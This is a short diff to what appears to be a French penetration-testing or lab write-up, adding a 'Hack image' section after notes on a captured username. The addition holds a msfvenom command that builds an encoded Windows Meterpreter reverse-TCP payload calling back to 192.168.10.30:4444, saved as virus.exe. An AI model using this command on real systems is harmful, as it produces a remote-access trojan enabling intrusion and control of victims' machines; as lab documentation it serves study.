@@ -922,3 +922,11 @@ POSSIBLE USERNAME FIELD FOUND: email=didi@chandouidoui.com
 ```
 
 Malhersuement, le mot de passe reste introuvable, même après avoir lancé une recherche dans le fichier XML exporté. 
+
+### Hack image
+
+Création d'un shellcode:
+
+```
+msfvenom –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
+```
